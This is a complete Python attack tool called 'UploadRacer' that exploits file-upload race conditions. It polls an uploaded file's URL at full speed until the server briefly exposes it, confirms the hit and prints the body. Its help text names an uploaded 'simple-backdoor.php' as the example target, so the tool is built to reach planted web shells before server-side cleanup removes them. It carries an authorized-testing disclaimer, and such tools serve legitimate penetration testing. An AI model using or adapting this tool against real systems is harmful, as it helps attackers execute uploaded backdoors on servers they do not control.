#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Continuously polls the public URL of a file you are uploading until the file
becomes reachable on the target, then prints its content. 

AUTHORIZED USE ONLY -- run this only against systems you own or have explicit
written permission to test.

"""

from __future__ import annotations

import argparse
import re
import sys
import time
from dataclasses import dataclass
from datetime import datetime
from urllib.parse import urlparse

TOOL_NAME = "UploadRacer"
__version__ = "1.0.0"

EXIT_OK = 0
EXIT_ERROR = 1
EXIT_USAGE = 2            
EXIT_INTERRUPTED = 130

HEARTBEAT_EVERY = 25     
BASELINE_ATTEMPTS = 3     


try:
    import requests
    from requests import exceptions as requests_exceptions
except ImportError:
    sys.stderr.write(
        f"[!] {TOOL_NAME}: missing required dependency 'requests'.\n"
        f"    Install it with:  python -m pip install requests\n"
    )
    sys.exit(EXIT_ERROR)

try:  
    import urllib3
    from urllib3.exceptions import InsecureRequestWarning
    _HAVE_URLLIB3 = True
except Exception:
    _HAVE_URLLIB3 = False


_ANSI_RE = re.compile(
    r"\x1b(?:\[[0-9;?]*[A-Za-z]|\][^\x07\x1b]*(?:\x07|\x1b\\)|[@-Z\\-_])"
)

_CTRL_RE = re.compile(r"[\x00-\x08\x0b-\x1f\x7f]")

_HEADER_TOKEN_RE = re.compile(r"^[!#$%&'*+\-.^_`|~0-9A-Za-z]+$")

_BANNER_ART = (
    "  #   # ####  #     ###   ###  ####    ####   ###   #### ##### ####",
    "  #   # #   # #    #   # #   # #   #   #   # #   # #     #     #   #",
    "  #   # ####  #    #   # ##### #   #   ####  ##### #    ####  ####",
    "  #   # #     #    #   # #   # #   #   #  #  #   # #     #     #  #",
    "   ###  #     #####  ###  #   # ####    #   # #   #  #### ##### #   #",
)

BANNER_LINES = (
    "=" * 70,
    *_BANNER_ART,
    f"        {TOOL_NAME} v{__version__}  |  File Upload RaceCondition Assistant",
    "        For authorized security testing only.",
    "=" * 70,
    "",
)


def _stamp() -> str:
    return datetime.now().strftime("%H:%M:%S")


def info(msg: str) -> None:
    print(f"[*] [{_stamp()}] {msg}", flush=True)


def ok(msg: str) -> None:
    print(f"[+] [{_stamp()}] {msg}", flush=True)


def warn(msg: str) -> None:
    print(f"[!] [{_stamp()}] {msg}", flush=True)


def err(msg: str) -> None:
    print(f"[x] [{_stamp()}] {msg}", file=sys.stderr, flush=True)


def sanitize_for_terminal(text: str) -> str:
    return _CTRL_RE.sub("", _ANSI_RE.sub("", text))


def validate_url(raw_url: str) -> str:
    url = raw_url.strip()
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("scheme must be http:// or https://")
    if not parsed.netloc:
        raise ValueError("missing host (e.g. http://host/path/file)")
    return url


@dataclass
class PollResult:
    error: str | None = None
    status: int | None = None
    body: str = ""
    bytes_read: int = 0
    truncated: bool = False
    content_type: str = ""
    elapsed: float = 0.0


def decode_body(data: bytes, response: requests.Response) -> str:
    encoding = response.encoding or getattr(response, "apparent_encoding", None)
    try:
        return data.decode(encoding or "utf-8", errors="replace")
    except (LookupError, TypeError, ValueError):
        return data.decode("utf-8", errors="replace")


def poll_once(session: requests.Session, url: str, args) -> PollResult:
    result = PollResult()
    response = None
    started = time.monotonic()
    try:
        response = session.get(
            url,
            timeout=(args.connect_timeout, args.timeout),
            allow_redirects=not args.no_redirects,
            stream=True,
        )
        result.status = response.status_code
        result.content_type = response.headers.get("Content-Type", "") or ""

        limit = args.max_body_bytes
        chunks, received, truncated = [], 0, False
        for chunk in response.iter_content(chunk_size=65536):
            if not chunk:
                continue
            if limit and received + len(chunk) >= limit:
                chunks.append(chunk[: limit - received])
                truncated = True
                break
            chunks.append(chunk)
            received += len(chunk)
        data = b"".join(chunks)
        result.bytes_read = len(data)
        result.truncated = truncated
        result.body = decode_body(data, response)
    except requests_exceptions.SSLError as exc:  
        result.error = f"TLS/SSL error: {exc}"
    except requests_exceptions.ConnectionError as exc:
        result.error = f"connection error: {exc}"
    except requests_exceptions.Timeout as exc:
        result.error = f"timeout: {exc}"
    except requests_exceptions.RequestException as exc:
        result.error = f"request failed: {exc}"
    except (OSError, ValueError) as exc:  
        result.error = f"response processing error: {exc}"
    finally:
        if response is not None:
            try:
                response.close()
            except Exception:
                pass
        result.elapsed = time.monotonic() - started
    return result


def classify(result: PollResult, args) -> tuple[bool, str]:
    if result.error:
        return False, f"transport: {result.error}"
    if args.success_status == 0:
        status_ok = 200 <= (result.status or 0) < 300
    else:
        status_ok = result.status == args.success_status
    if not status_ok:
        return False, f"status {result.status} != {args.success_status or '2xx'}"
    if args.exclude in result.body:
        return False, "'not-live' marker still present"
    if args.include and args.include not in result.body:
        return False, "positive signature not present yet"
    return True, "all detection layers agree"


def record_baseline(session: requests.Session, url: str, args) -> PollResult:
    info("Recording baseline (root state) of the target ...")
    last = PollResult(error="no response captured")
    for attempt in range(1, BASELINE_ATTEMPTS + 1):
        last = poll_once(session, url, args)
        if last.error is None:
            marker_found = args.exclude in last.body
            live, _ = classify(last, args)
            info(
                f"baseline: status={last.status} bytes={last.bytes_read}"
                f"{' (truncated)' if last.truncated else ''} "
                f"exclude-marker={'found' if marker_found else 'NOT found'}"
            )
            if live:
                warn("The target ALREADY classifies as LIVE -- nothing to race.")
                report_success(last, args, attempts=0, elapsed=0.0, already_live=True)
                sys.exit(EXIT_OK)
            if not marker_found and not args.force:
                warn("The --exclude marker was NOT found in the baseline response.")
                warn("Either the file is already live, or the marker does not match")
                warn("the server's real 'not found' behaviour -> unreliable detection.")
                err("Aborting. Fix --exclude, or re-run with --force to race anyway.")
                sys.exit(EXIT_ERROR)
            return last
        warn(f"baseline attempt {attempt}/{BASELINE_ATTEMPTS} failed: {last.error}")
        time.sleep(args.error_delay)
    err(f"Target unreachable after {BASELINE_ATTEMPTS} baseline attempts: {last.error}")
    sys.exit(EXIT_ERROR)


def report_success(result: PollResult, args, attempts: int, elapsed: float,
                   already_live: bool = False) -> None:
    body = sanitize_for_terminal(result.body)
    print()
    print("=" * 70)
    if already_live:
        ok("File is ALREADY live -- retrieved on first contact.")
    else:
        ok(f"YOU WON THE RACE! File went live after {attempts} polls "
           f"({elapsed:.2f}s), confirmed {args.confirmations}x in a row.")
    info(
        f"status={result.status}  bytes_read={result.bytes_read}"
        f"{' (TRUNCATED -- raise --max-body-bytes)' if result.truncated else ''}  "
        f"content-type='{result.content_type}'"
    )
    if args.max_display and len(body) > args.max_display:
        shown = body[: args.max_display]
        shown += (
            f"\n... [display truncated: {len(body) - args.max_display} more "
            f"characters, use --max-display 0 for full output]"
        )
    else:
        shown = body
    print("-" * 70)
    print(shown if shown else "(empty body)")
    print("-" * 70)


def run_race(session: requests.Session, url: str, args, baseline: PollResult) -> int:
    print(f"[*] You can upload the file now; polling: {url}")
    print("[*] Press CTRL+C (^C) to exit")
    print("[+] The race has begun...")

    confirmations = 0
    consecutive_errors = 0
    attempts = 0
    reason = "baseline"
    started = time.monotonic()
    try:
        while True:
            attempts += 1
            if args.max_attempts and attempts > args.max_attempts:
                err(f"Gave up after {args.max_attempts} polls "
                    f"({time.monotonic() - started:.1f}s) -- file never went live.")
                return EXIT_ERROR

            result = poll_once(session, url, args)

            if result.error:
                consecutive_errors += 1
                warn(f"poll {attempts}: {result.error} "
                     f"[{consecutive_errors}/{args.net_fail_limit}]")
                if consecutive_errors >= args.net_fail_limit:
                    err("Transport failure budget exhausted -- aborting "
                        "(is the host still up?)")
                    return EXIT_ERROR
                time.sleep(args.error_delay)
                continue
            consecutive_errors = 0

            live, reason = classify(result, args)
            if live:
                confirmations += 1
            else:
                if confirmations:
                    info(f"confirmation streak reset ({reason})")
                confirmations = 0

            if confirmations >= args.confirmations:
                report_success(result, args, attempts, time.monotonic() - started)
                return EXIT_OK

            if attempts % HEARTBEAT_EVERY == 0:
                info(f"heartbeat: {attempts} polls, "
                     f"{time.monotonic() - started:.1f}s elapsed, "
                     f"last status={result.status}, last verdict: {reason}")

            if args.delay > 0 and confirmations == 0:
                time.sleep(args.delay)
    except KeyboardInterrupt:
        print(file=sys.stderr)
        warn(f"Interrupted after {attempts} polls "
             f"({time.monotonic() - started:.1f}s); no live file detected.")
        return EXIT_INTERRUPTED


def get_args(argv: list[str] | None = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog=TOOL_NAME,
        description="Win the File Upload Race! Polls the public URL of an "
                    "uploaded file until it goes live (authorized testing only).",
        epilog='Example: %(prog)s --url http://target/uploads/x.php --exclude "Not Found"',
    )
    parser.add_argument("--url", required=True,
        help="URL to the uploaded file location (e.g. http://<DOMAIN>/uploads/simple-backdoor.php)")
    parser.add_argument("--exclude", required=True,
        help='Part of the response of a non-existent file (e.g. "Not Found")')
    parser.add_argument("--include", default=None,
        help="Optional signature expected in the LIVE file; strongly reduces false positives")
    parser.add_argument("--success-status", type=int, default=200, metavar="CODE",
        help="HTTP status that counts as 'file is live' (0 = any 2xx). Default: 200")
    parser.add_argument("--confirmations", type=int, default=2, metavar="N",
        help="Consecutive positive polls required before declaring victory "
             "(set 1 for ultra-fast deletion windows). Default: 2")
    parser.add_argument("--timeout", type=float, default=10.0, metavar="SEC",
        help="Per-request read timeout. Default: 10")
    parser.add_argument("--connect-timeout", type=float, default=5.0, metavar="SEC",
        help="Per-request connect timeout. Default: 5")
    parser.add_argument("--delay", type=float, default=0.0, metavar="SEC",
        help="Pause between polls (0 = race at full speed). Default: 0")
    parser.add_argument("--max-attempts", type=int, default=0, metavar="N",
        help="Abort after N polls (0 = unlimited). Default: 0")
    parser.add_argument("--net-fail-limit", type=int, default=10, metavar="N",
        help="Abort after N consecutive transport errors. Default: 10")
    parser.add_argument("--error-delay", type=float, default=1.0, metavar="SEC",
        help="Pause after a transport error before retrying. Default: 1")
    parser.add_argument("--max-body-bytes", type=int, default=1048576, metavar="BYTES",
        help="Inspect at most this many response bytes; detection operates on the "
             "inspected portion (0 = unlimited). Default: 1048576")
    parser.add_argument("--max-display", type=int, default=4096, metavar="CHARS",
        help="Print at most this many characters of the final body (0 = unlimited). Default: 4096")
    parser.add_argument("--user-agent", default=f"{TOOL_NAME}/{__version__}", metavar="UA",
        help="User-Agent header. Default: %(default)s")
    parser.add_argument("--header", action="append", default=None, metavar='"NAME: VALUE"',
        help="Extra request header (repeatable)")
    parser.add_argument("--proxy", default=None, metavar="URL",
        help="Route requests through a proxy, e.g. http://127.0.0.1:8080 (Burp)")
    parser.add_argument("--insecure", action="store_true",
        help="Disable TLS certificate verification (labs/self-signed only)")
    parser.add_argument("--no-redirects", action="store_true",
        help="Treat redirects as 'not live yet' instead of following them")
    parser.add_argument("--force", action="store_true",
        help="Start the race even if --exclude was NOT found in the baseline response")
    parser.add_argument("--version", action="version", version=f"%(prog)s {__version__}")
    args = parser.parse_args(argv)
    args.header = args.header or []

    
    try:
        args.url = validate_url(args.url)
    except ValueError as exc:
        parser.error(f"--url: {exc}")
    if not args.exclude.strip():
        parser.error("--exclude must be a non-empty marker string")
    if args.confirmations < 1:
        parser.error("--confirmations must be >= 1")
    if args.timeout <= 0 or args.connect_timeout <= 0:
        parser.error("timeouts must be positive")
    if args.delay < 0 or args.error_delay < 0:
        parser.error("--delay/--error-delay must be >= 0")
    if args.max_attempts < 0 or args.net_fail_limit < 1:
        parser.error("--max-attempts must be >= 0; --net-fail-limit must be >= 1")
    if args.max_body_bytes < 0 or args.max_display < 0:
        parser.error("--max-body-bytes/--max-display must be >= 0")
    for header in args.header:
        name = header.partition(":")[0].strip()
        if ("\r" in header or "\n" in header
                or not _HEADER_TOKEN_RE.match(name)):
            parser.error(f'invalid header {header!r} (use "Name: Value", RFC 7230 token)')
    return args


def build_session(args: argparse.Namespace) -> requests.Session:
    session = requests.Session()          
    session.verify = not args.insecure    
    if args.proxy:
        session.proxies = {"http": args.proxy, "https": args.proxy}
    session.headers["User-Agent"] = args.user_agent
    for header in args.header:            
        name, _, value = header.partition(":")
        session.headers[name.strip()] = value.strip()
    if args.insecure and _HAVE_URLLIB3:
        urllib3.disable_warnings(InsecureRequestWarning)
    return session


def main(argv: list[str] | None = None) -> int:
    print("\n".join(BANNER_LINES))
    args = get_args(argv)
    info(f"{TOOL_NAME} v{__version__} -- target: {args.url}")
    info(f"detection: exclude={args.exclude!r}"
         + (f", include={args.include!r}" if args.include else "")
         + f", status={args.success_status or '2xx'}, confirmations={args.confirmations}")
    if args.insecure:
        warn("TLS certificate verification is DISABLED (--insecure) -- lab use only.")

    session = build_session(args)
    baseline = record_baseline(session, args.url, args)
    info(f"Baseline locked: status={baseline.status}, {baseline.bytes_read} bytes. "
         "Watching for deviation ...")
    return run_race(session, args.url, args, baseline)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:  
        print(file=sys.stderr)
        warn("Interrupted by user.")
        sys.exit(EXIT_INTERRUPTED)
